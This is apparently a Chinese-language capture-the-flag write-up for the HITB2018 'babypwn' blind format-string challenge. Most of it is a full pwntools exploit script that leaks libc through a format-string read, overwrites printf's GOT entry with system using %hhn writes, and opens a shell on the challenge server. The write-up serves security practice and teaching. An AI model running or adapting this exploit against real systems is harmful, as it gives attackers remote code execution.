这题就是最简单的blind pwn

![](https://github.com/charlieleex/CTF_Writeup/blob/master/HITB2018/babypwn/t1.jpg)

大概反编译之后就是这样

dump的脚本是leak.py，但是也要修改一下才能用，dump下来的是fmt，可以用ida打开，但是反编译也不是很成功

这题利用Dynelf可以leak出system的地址，然后利用格式化字符串漏洞就可以直接将got表中printf的值修改成system的地址

但是生成payload的函数有点难写，具体可以参照我写的函数


下面是payload


```
from pwn import *

p=remote('47.75.182.113', 9999)
#context.log_level='debug'

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.sendline(x)

def leak(addr):
    payload="ab%7$scd"+p64(addr)
    se(payload)
    ru('ab')
    data=ru('cd')[:-2]
    if len(data)==0:
        return '\x00'
    return data


def genpayload(addr,value):
    v=0
    tv=p64(value)
    payload=""
    for i in range(3):
        w=(ord(tv[i])-v+256)%256
        v=ord(tv[i])
        payload+="%"+str(w)+"c%"+str(11+i)+"$hhn"
    payload=payload.ljust(0x28,'a')
    for i in range(3):
        payload+=p64(addr+i)
    return payload


gets=u64(leak(0x601028)+'\x00\x00')

d = DynELF(leak, gets)

base=d.lookup(None,'libc')
system=d.lookup('system','libc')

context.log_level='debug'

payload=genpayload(0x601020,system)

se(payload)

sleep(0.5)

se('/bin/sh\x00')

p.interactive()


```
